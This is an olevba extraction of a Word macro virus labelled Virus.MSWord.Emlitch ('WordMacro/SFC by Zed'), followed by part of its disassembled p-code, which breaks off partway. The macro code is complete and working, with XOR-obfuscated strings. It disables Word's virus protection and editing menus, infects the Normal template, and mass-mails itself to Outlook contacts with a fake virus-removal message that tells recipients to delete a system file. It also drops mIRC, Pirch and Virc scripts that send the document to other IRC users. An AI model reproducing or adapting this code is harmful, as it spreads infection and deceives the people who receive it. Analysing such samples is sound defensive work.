olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Emlitch
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Emlitch - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SFC.bas 
in file: ./Virus.MSWord.Emlitch - OLE stream: 'Macros/VBA/SFC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Set fso = CreateObject(Enc("Uetovroha(@ojcUurckIdlcer"))
Options.VirusProtection = False: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False
OfficeKey = Enc("NMC_YESTTCHRYSUCTZUi`rqgtcZKoetiui`rZI``oecZ") & Application.Version & Enc("ZQitbZUcestor")
For OMLoop = 0 To 1
OMArray = Array(Enc("GeecuuPDIK"), Enc("Jcpcj"))
System.PrivateProfileString(Enc(""), OfficeKey, OMArray(OMLoop)) = 1&
Next
With CommandBars(Enc("Riiju"))
.Controls(Enc("Kgeti")).Enabled = False
.Controls(Enc("Rckvjgrcu&ghb&Gbb+Ohu(((")).Enabled = False
.Controls(Enc("Esuriko|c(((")).Enabled = False
End With
With CommandBars(Enc("Kgeti"))
.Controls(Enc("Kgetiu(((")).Enabled = False
.Controls(Enc("Ucestor(((")).Enabled = False
End With
With CommandBars(Enc("@itkgr"))
.Controls(Enc("Urjc(((")).Enabled = False
End With
With CommandBars(Enc("Pocq"))
.Controls(Enc("Urgrsu&Dgt")).Enabled = False
.Controls(Enc("Riijdgtu")).Enabled = False
End With
System.PrivateProfileString(Enc(""), Enc("NMC_YESTTCHRYSUCTZUi`rqgtcZ\cbZ"), Enc("U@E")) = Enc("QitbKgeti)U@E&d&\cb")
If ActiveDocument.VBProject.VBComponents.Item(Enc("U@E")).Name = Enc("U@E") Then
ActiveDocument.VBProject.VBComponents(Enc("U@E")).Export Enc("E<ZQohuhb54(uhb")
SetAttr Enc("E<ZQohuhb54(uhb"), vbHidden
End If
If ActiveDocument.VBProject.VBComponents.Item(Enc("U@E")).Name <> Enc("U@E") Then
ActiveDocument.VBProject.VBComponents.Import Enc("E<ZQohuhb54(uhb")
End If
If NormalTemplate.VBProject.VBComponents.Item(Enc("U@E")).Name <> Enc("U@E") Then
NormalTemplate.VBProject.VBComponents.Import Enc("E<ZQohuhb54(uhb")
End If
If InStr(1, ActiveDocument.Name, Enc("Bieskchr")) = False Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Set OutlookApp = CreateObject(Enc("Isrjiim(Gvvjoegroih"))
If OutlookApp <> Enc("") Then
Set GNS = OutlookApp.GetNamespace(Enc("KGVO"))
For EmlNumber = 1 To GNS.GetDefaultFolder(10).Items.Count
Set EmailContact = GNS.GetDefaultFolder(10).Items.Item(EmlNumber)
EmailReg = Enc("NMC_YESTTCHRYSUCTZUi`rqgtcZ\cbZU@EZTceitbEihrgeru")
EmailKey = System.PrivateProfileString(Enc(""), EmailReg, EmailContact)
If EmailKey = Enc("") Then
Randomize
Select Case Int((20 * Rnd) + 1)
Case 1: EmlMsg = Enc("Eikvsrct&potsu&gjctr")
Case 2: EmlMsg = Enc("Okvitrghr&hcqu")
Case 3: EmlMsg = Enc("Okvitrghr")
Case 4: EmlMsg = Enc("Eikvsrct&gbpouit")
Case 5: EmlMsg = Enc("Uikc&gbpoec")
Case 6: EmlMsg = Enc("Gbpoec&ih&eikvsrctu")
Case 7: EmlMsg = Enc("Gbpoec&tcagtboha&eikvsrctu")
Case 8: EmlMsg = Enc("Okvitrghr&oh`itkgroih")
Case 9: EmlMsg = Enc("Vjcguc&tcgb")
Case 10: EmlMsg = Enc("Stachr")
Case 11: EmlMsg = Enc("Stachr&oh`itkgroih")
Case 12: EmlMsg = Enc("Hcqu&tcagtboha&eikvsrctu")
Case 13: EmlMsg = Enc("Oh`i&ih&eikvsrctu")
Case 14: EmlMsg = Enc("Okvitrghr&oh`i")
Case 15: EmlMsg = Enc("Stachr&oh`i")
Case 16: EmlMsg = Enc("Okvitrghr&hiroec")
Case 17: EmlMsg = Enc("Stachr&hiroec")
Case 18: EmlMsg = Enc("Uikc&bcrgoju")
Case 19: EmlMsg = Enc("Okvitrghr&bcrgoju")
Case 20: EmlMsg = Enc("Stachr&bcrgoju")
End Select
Randomize
Select Case Int((3 * Rnd) + 1)
Case 1: EmlPrefix = Enc("@qb<&")
Case 2: EmlPrefix = Enc("")
Case 3: EmlPrefix = Enc("@q<&")
End Select
Randomize
If Int((6 * Rnd) + 1) = 6 Then
EmlPrefix = UCase(EmlPrefix)
End If
Set OutlookEmail = OutlookApp.CreateItem(0)
OutlookEmail.To = EmailContact
OutlookEmail.Subject = EmlPrefix & EmlMsg
OutlookEmail.Body = Enc("Ncjji&tcgbctu*") & vbCrLf _
& vbCrLf _
& Enc("O&ngpc&boueipctcb&rngr&k&eikvsrct&ngu&ngb&g&eikvsrct&potsu*&") _
& Enc("ghb&O&ngpc&tckipcb&gjj&rtgecu&i`&or(&Rnou&potsu&ou&egsuoha&vtidjcku&`it&") _
& Enc("jiru&i`&eikvsrct&suctu&qitjbqobc(") & vbCrLf _
& Enc("Niqcpct*&rnctc&ou&g&qg&ri&encem&ri&ucc&o`&is&ngpc&rnou&potsu&ih&ist&eikvsrct&uurck<") & vbCrLf _
& Enc("") & vbCrLf _
& Enc("Ejoem&$Urgtr$*&ghb&rnch&uetijj&sv&ri&$@ohb$&it&$Ucgten$&ghb&ucjcer&or(") & vbCrLf _
& Enc("Qgor&shroj&rnc&`ojc&ucgten&gvvjoegroih&gvvcgtu(") & vbCrLf _
& Enc("Qnch&rnc&`ojc&ucgten&gvvjoegroih&gvvcgtu*&rvc&$U`e(c~c$&ghb&ejoem&rnc&`ohb&dsrrih(") & vbCrLf _
& Enc("") & vbCrLf _
& Enc("O`&ist&eikvsrct&`ohbu&rnou&`ojc*&BI&HIR&ivch&rnou&`ojc(&") _
& Enc("Or&ou&oh`cercb&qorn&rnou&potsu(&_is&egh&bcjcrc&rnou&`ojc*&") _
& Enc("dsr&rnc&potsu&kg&urojj&dc&geropc&uikcqnctc&ih&ist&eikvsrct(&Ri&tckipc&rnou&potsu*&") _
& Enc("O&ngpc&ohejsbcb&g&bieskchr&egjjcb&") & Chr(34) & ActiveDocument.Name & Chr(34) & Enc("&qnoen&eihrgohu&kitc&") _
& Enc("ohurtseroihu&ih&niq&ri&tckipc&rnou&potsu&`tik&ist&eikvsrct(") & vbCrLf & vbCrLf & Enc("Rnghmu(")
OutlookEmail.Attachments.Add ActiveDocument.FullName
OutlookEmail.Importance = 2
OutlookEmail.DeleteAfterSubmit = True
OutlookEmail.Send
System.PrivateProfileString(Enc(""), EmailReg, EmailContact) = TimeValue(Now)
End If
Next EmlNumber
For EN1 = 1 To GNS.GetDefaultFolder(4).Items.Count
EmlSwitch = 1
Set OE2 = OutlookApp.CreateItem(0)
Set EmailMsg = GNS.GetDefaultFolder(4).Items.Item(EmlSwitch)
If EmailMsg.To <> Enc("") Then OE2.To = EmailMsg.To
If EmailMsg.CC <> Enc("") Then OE2.CC = EmailMsg.CC
If EmailMsg.BCC <> Enc("") Then OE2.BCC = EmailMsg.BCC
OE2.Subject = EmailMsg.Subject
OE2.Body = EmailMsg.Body
OE2.Attachments.Add ActiveDocument.FullName
OE2.Importance = EmailMsg.Importance
OE2.DeleteAfterSubmit = True
OE2.Send
GNS.GetDefaultFolder(4).Items.Remove (EmlSwitch)
EmlSwitch = EmlSwitch + 1
Next EN1
End If
PgDir = System.PrivateProfileString(Enc(""), Enc("NMC_YJIEGJYKGENOHCZUi`rqgtcZKoetiui`rZQohbiquZEsttchrPctuoih"), Enc("Vtiatgk@ojcuBot"))
If PgDir <> Enc("") Then
For MircLoop = 0 To 3
MircArray = Array(Enc("E<ZKote"), Enc("E<ZKote54"), PgDir & Enc("ZKote"), PgDir & Enc("ZKote54"))
If fso.FolderExists(MircArray(MircLoop)) Then
Open MircArray(MircLoop) & Enc("ZUetovr(oho") For Output As 1
Print #1, Enc("]uetovr[")
Print #1, Enc("h3;&ih&7<LIOH<%<}")
Print #1, Enc("h0;&)o`&.&") & Chr(36) & Enc("hoem&;;&") & Chr(36) & Enc("kc&/&}&ngjr&{")
Print #1, Enc("h1;&)kua&") & Chr(36) & Enc("hoem&Ngpc&g&jiim&gr&rnc&") & ActiveDocument.Name & Enc("&</")
Print #1, Enc("h>;&)bee&uchb&+e&") & Chr(36) & Enc("hoem&") & ActiveDocument.FullName
Print #1, Enc("h?;&{")
Close 1
End If
Next
For PirchLoop = 0 To 3
PirchArray = Array(Enc("E<ZVoten"), Enc("E<ZVoten54"), PgDir & Enc("ZVoten"), PgDir & Enc("ZVoten54"))
If fso.FolderExists(PirchArray(PirchLoop)) Then
Open PirchArray(PirchLoop) & Enc("ZCpchru(oho") For Output As 2
Print #2, Enc("]Jcpcju[")
Print #2, Enc("Chgdjcb;7")
Print #2, Enc("Eishr;0")
Print #2, Enc("Jcpcj7;666+Shmhiqhu")
Print #2, Enc("666+ShmhiqhuChgdjcb;7")
Print #2, Enc("Jcpcj4;766+Jcpcj&766")
Print #2, Enc("766+Jcpcj&766Chgdjcb;7")
Print #2, Enc("Jcpcj5;466+Jcpcj&466")
Print #2, Enc("466+Jcpcj&466Chgdjcb;7")
Print #2, Enc("Jcpcj2;566+Jcpcj&566")
Print #2, Enc("566+Jcpcj&566Chgdjcb;7")
Print #2, Enc("Jcpcj3;266+Jcpcj&266")
Print #2, Enc("266+Jcpcj&266Chgdjcb;7")
Print #2, Enc("Jcpcj0;366+Jcpcj&366")
Print #2, Enc("366+Jcpcj&366Chgdjcb;7")
Print #2, Enc("")
Print #2, Enc("]666+Shmhiqhu[")
Print #2, Enc("SuctEishr;6")
Print #2, Enc("Cpchr7;IH&LIOH<%<)kua&") & Chr(36) & Enc("hoem&Jiim&gr&rnc&") & ActiveDocument.Name & Enc("&</")
Print #2, Enc("CpchrEishr;6")
Print #2, Enc("")
Print #2, Enc("]766+Jcpcj&766[")
Print #2, Enc("Suct7;,',F,")
Print #2, Enc("SuctEishr;7")
Print #2, Enc("Cpchr7;IH&LIOH<%<)bee&uchb&") & Chr(36) & Enc("hoem&") & ActiveDocument.FullName
Print #2, Enc("CpchrEishr;7")
Print #2, Enc("")
Print #2, Enc("]466+Jcpcj&466[")
Print #2, Enc("SuctEishr;6")
Print #2, Enc("CpchrEishr;6")
Print #2, Enc("")
Print #2, Enc("]566+Jcpcj&566[")
Print #2, Enc("SuctEishr;6")
Print #2, Enc("CpchrEishr;6")
Print #2, Enc("")
Print #2, Enc("]266+Jcpcj&266[")
Print #2, Enc("SuctEishr;6")
Print #2, Enc("CpchrEishr;6")
Print #2, Enc("")
Print #2, Enc("]366+Jcpcj&366[")
Print #2, Enc("SuctEishr;6")
Print #2, Enc("CpchrEishr;6")
Close 2
End If
Next
For VircLoop = 0 To 3
VircArray = Array(Enc("E<ZPote"), Enc("E<ZPote54"), PgDir & Enc("ZPote"), PgDir & Enc("ZPote54"))
If fso.FolderExists(VircArray(VircLoop)) Then
System.PrivateProfileString(Enc(""), Enc("NMC_YSUCTUZ(BC@GSJRZUi`rqgtcZKcagjorn&Ui`rqgtcZPousgj&OTE?0ZCpchru"), Enc("Cpchr71")) = Enc("bee&uchb&") & Chr(36) & Enc("hoem&") & ActiveDocument.FullName
End If
Next
End If
Else
ActiveDocument.Saved = True
End If
End Sub
Sub ToolsMacro()
End Sub
Sub ViewVBCode()
End Sub
Sub FileTemplates()
End Sub
Function Enc(TextStr)
For LenLoop = 1 To Len(TextStr)
Enc = Enc & Chr(Asc(Mid(TextStr, LenLoop, 1)) Xor (6 Mod 255))
Next
End Function
' WordMacro/SFC by Zed
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Emlitch
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/SFC - 15063 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	SetStmt 
' 	LitStr 0x001A "Uetovroha(@ojcUurckIdlcer"
' 	ArgsLd Enc 0x0001 
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' 	LitStr 0x002C "NMC_YESTTCHRYSUCTZUi`rqgtcZKoetiui`rZI``oecZ"
' 	ArgsLd Enc 0x0001 
' 	Ld Application 
' 	MemLd Version 
' 	Concat 
' 	LitStr 0x000E "ZQitbZUcestor"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	St OfficeKey 
' Line #5:
' 	StartForVariable 
' 	Ld OMLoop 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	For 
' Line #6:
' 	LitStr 0x000A "GeecuuPDIK"
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x0005 "Jcpcj"
' 	ArgsLd Enc 0x0001 
' 	ArgsArray Array 0x0002 
' 	St OMArray 
' Line #7:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Ld OfficeKey 
' 	Ld OMLoop 
' 	ArgsLd OMArray 0x0001 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #8:
' 	StartForVariable 
' 	Next 
' Line #9:
' 	StartWithExpr 
' 	LitStr 0x0005 "Riiju"
' 	ArgsLd Enc 0x0001 
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #10:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Kgeti"
' 	ArgsLd Enc 0x0001 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	LitVarSpecial (False)
' 	LitStr 0x0018 "Rckvjgrcu&ghb&Gbb+Ohu((("
' 	ArgsLd Enc 0x0001 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #12:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Esuriko|c((("
' 	ArgsLd Enc 0x0001 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #13:
' 	EndWith 
' Line #14:
' 	StartWithExpr 
' 	LitStr 0x0005 "Kgeti"
' 	ArgsLd Enc 0x0001 
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #15:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "Kgetiu((("
' 	ArgsLd Enc 0x0001 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #16:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Ucestor((("
' 	ArgsLd Enc 0x0001 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #17:
' 	EndWith 
' Line #18:
' 	StartWithExpr 
' 	LitStr 0x0006 "@itkgr"
' 	ArgsLd Enc 0x0001 
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #19:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Urjc((("
' 	ArgsLd Enc 0x0001 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #20:
' 	EndWith 
' Line #21:
' 	StartWithExpr 
' 	LitStr 0x0004 "Pocq"
' 	ArgsLd Enc 0x0001 
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #22:
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Urgrsu&Dgt"
' 	ArgsLd Enc 0x0001 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #23:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Riijdgtu"
' 	ArgsLd Enc 0x0001 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #24:
' 	EndWith 
' Line #25:
' 	LitStr 0x0014 "QitbKgeti)U@E&d&\cb"
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x001F "NMC_YESTTCHRYSUCTZUi`rqgtcZ\cbZ"
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x0003 "U@E"
' 	ArgsLd Enc 0x0001 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #26:
' 	LitStr 0x0003 "U@E"
' 	ArgsLd Enc 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "U@E"
' 	ArgsLd Enc 0x0001 
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitStr 0x000F "E<ZQohuhb54(uhb"
' 	ArgsLd Enc 0x0001 
' 	LitStr 0x0003 "U@E"
' 	ArgsLd Enc 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #28:
' 	LitStr 0x000F "E<ZQohuhb54(uhb"
' 	ArgsLd Enc 0x0001 
' 	Ld vbHidden 
' 	ArgsCall SetAttr 0x0002 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	LitStr 0x0003 "U@E"
' 	ArgsLd Enc 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "U@E"
' 	ArgsLd Enc 0x0001 
' 	Ne 
' 	IfBlock 
' Line #31:
' 	LitStr 0x000F "E<ZQohuhb54(uhb"
' 	ArgsLd Enc 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	LitStr 0x0003 "U@E"
' 	ArgsLd Enc 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0003 "U@E"
' 	ArgsLd Enc 0x0001 
' 	Ne 
' 	IfBlock 
' Line #34:
' 	LitStr 0x000F "E<ZQohuhb54(uhb"
' 	ArgsLd Enc 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Bieskchr"
' 	ArgsLd Enc 0x0001 
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #37:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #38:
' 	SetStmt 
' 	LitStr 0x0013 "Isrjiim(Gvvjoegroih"
' 	ArgsLd Enc 0x0001 
' 	ArgsLd CreateObject 0x0001 
' 	Set OutlookApp 
' Line #39:
' 	Ld OutlookApp 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Ne 
' 	IfBlock 
' Line #40:
' 	SetStmt 
' 	LitStr 0x0004 "KGVO"
' 	ArgsLd Enc 0x0001 
' 	Ld OutlookApp 
' 	ArgsMemLd GetNamespace 0x0001 
' 	Set GNS 
' Line #41:
' 	StartForVariable 
' 	Ld EmlNumber 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	Ld GNS 
' 	ArgsMemLd GetDefaultFolder 0x0001 
' 	MemLd Items 
' 	MemLd Count 
' 	For 
' Line #42:
' 	SetStmt 
' 	Ld EmlNumber 
' 	LitDI2 0x000A 
' 	Ld GNS 
' 	ArgsMemLd GetDefaultFolder 0x0001 
' 	MemLd Items 
' 	ArgsMemLd Item 0x0001 
' 	Set EmailContact 
' Line #43:
' 	LitStr 0x0031 "NMC_YESTTCHRYSUCTZUi`rqgtcZ\cbZU@EZTceitbEihrgeru"
' 	ArgsLd Enc 0x0001 
' 	St EmailReg 
' Line #44:
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Ld EmailReg 
' 	Ld EmailContact 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St EmailKey 
' Line #45:
' 	Ld EmailKey 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Eq 
' 	IfBlock 
' Line #46:
' 	ArgsCall Read 0x0000 
' Line #47:
' 	LitDI2 0x0014 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	SelectCase 
' Line #48:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0014 "Eikvsrct&potsu&gjctr"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #49:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000E "Okvitrghr&hcqu"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #50:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0009 "Okvitrghr"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #51:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Eikvsrct&gbpouit"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #52:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000B "Uikc&gbpoec"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #53:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0013 "Gbpoec&ih&eikvsrctu"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #54:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x001A "Gbpoec&tcagtboha&eikvsrctu"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #55:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Okvitrghr&oh`itkgroih"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #56:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000B "Vjcguc&tcgb"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #57:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0006 "Stachr"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #58:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0012 "Stachr&oh`itkgroih"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #59:
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0018 "Hcqu&tcagtboha&eikvsrctu"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #60:
' 	LitDI2 0x000D 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Oh`i&ih&eikvsrctu"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #61:
' 	LitDI2 0x000E 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000E "Okvitrghr&oh`i"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #62:
' 	LitDI2 0x000F 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000B "Stachr&oh`i"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #63:
' 	LitDI2 0x0010 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0010 "Okvitrghr&hiroec"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #64:
' 	LitDI2 0x0011 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000D "Stachr&hiroec"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #65:
' 	LitDI2 0x0012 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000C "Uikc&bcrgoju"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #66:
' 	LitDI2 0x0013 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Okvitrghr&bcrgoju"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #67:
' 	LitDI2 0x0014 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000E "Stachr&bcrgoju"
' 	ArgsLd Enc 0x0001 
' 	St EmlMsg 
' Line #68:
' 	EndSelect 
' Line #69:
' 	ArgsCall Read 0x0000 
' Line #70:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	SelectCase 
' Line #71:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 "@qb<&"
' 	ArgsLd Enc 0x0001 
' 	St EmlPrefix 
' Line #72:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	St EmlPrefix 
' Line #73:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0004 "@q<&"
' 	ArgsLd Enc 0x0001 
' 	St EmlPrefix 
' Line #74:
' 	EndSelect 
' Line #75:
' 	ArgsCall Read 0x0000 
' Line #76:
' 	LitDI2 0x0006 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #77:
' 	Ld EmlPrefix 
' 	ArgsLd UCase 0x0001 
' 	St EmlPrefix 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld OutlookApp 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set OutlookEmail 
' Line #80:
' 	Ld EmailContact 
' 	Ld OutlookEmail 
' 	MemSt True 
' Line #81:
' 	Ld EmlPrefix 
' 	Ld EmlMsg 
' 	Concat 
' 	Ld OutlookEmail 
' 	MemSt Subject 
' Line #82:
' 	LineCont 0x003C 0A 00 00 00 0C 00 00 00 11 00 00 00 16 00 00 00 1D 00 00 00 24 00 00 00 2B 00 00 00 32 00 00 00 39 00 00 00 40 00 00 00 47 00 00 00 4C 00 00 00 51 00 00 00 56 00 00 00 6E 00 00 00
' 	LitStr 0x000E "Ncjji&tcgbctu*"
' 	ArgsLd Enc 0x0001 
' 	Ld vbCrLf 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x003D "O&ngpc&boueipctcb&rngr&k&eikvsrct&ngu&ngb&g&eikvsrct&potsu*&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	LitStr 0x0048 "ghb&O&ngpc&tckipcb&gjj&rtgecu&i`&or(&Rnou&potsu&ou&egsuoha&vtidjcku&`it&"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	LitStr 0x0021 "jiru&i`&eikvsrct&suctu&qitjbqobc("
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0057 "Niqcpct*&rnctc&ou&g&qg&ri&encem&ri&ucc&o`&is&ngpc&rnou&potsu&ih&ist&eikvsrct&uurck<"
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0046 "Ejoem&$Urgtr$*&ghb&rnch&uetijj&sv&ri&$@ohb$&it&$Ucgten$&ghb&ucjcer&or("
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x002F "Qgor&shroj&rnc&`ojc&ucgten&gvvjoegroih&gvvcgtu("
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0053 "Qnch&rnc&`ojc&ucgten&gvvjoegroih&gvvcgtu*&rvc&$U`e(c~c$&ghb&ejoem&rnc&`ohb&dsrrih("
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0000 ""
' 	ArgsLd Enc 0x0001 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
